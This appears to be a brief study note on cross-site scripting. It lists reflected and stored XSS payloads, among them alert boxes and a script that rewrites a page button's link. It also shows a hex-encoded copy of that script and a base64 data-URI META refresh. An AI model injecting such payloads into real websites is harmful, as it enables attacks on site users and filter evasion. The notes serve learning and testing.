# XSS

[Reference][1]

## Non-Persistent

```javascript
?name=juette<script>alert('XSS!')</script>
```

```javascript
?name=juette<script>window.onload = function() {var link=document.getElementsByClassName("btn");link[0].href="https://duckduckgo.com/";}</script>
```

Encode the string from ASCI to Hex (http://convertstring.com/de/EncodeDecode/HexEncode):
```
?name=Fabian%3c%73%63%72%69%70%74%3e%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%76%61%72%20%6c%69%6e%6b%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%43%6c%61%73%73%4e%61%6d%65%28%22%62%74%6e%22%29%3b%6c%69%6e%6b%5b%30%5d%2e%68%72%65%66%3d%22%68%74%74%70%73%3a%2f%2f%64%75%63%6b%64%75%63%6b%67%6f%2e%63%6f%6d%2f%22%3b%7d%3c%2f%73%63%72%69%70%74%3e
```

## Persistent XSS Attack

```javascript

<script>alert('XSS!')</script>
```

[Reference][2] -
XSS using code encoding. Encode our script in base64 and place it in META tag.

```html
<META HTTP-EQUIV="refresh"
CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIScpPC9zY3JpcHQ+">
```

[1]: http://www.thegeekstuff.com/2012/02/xss-attack-examples/
[2]: https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
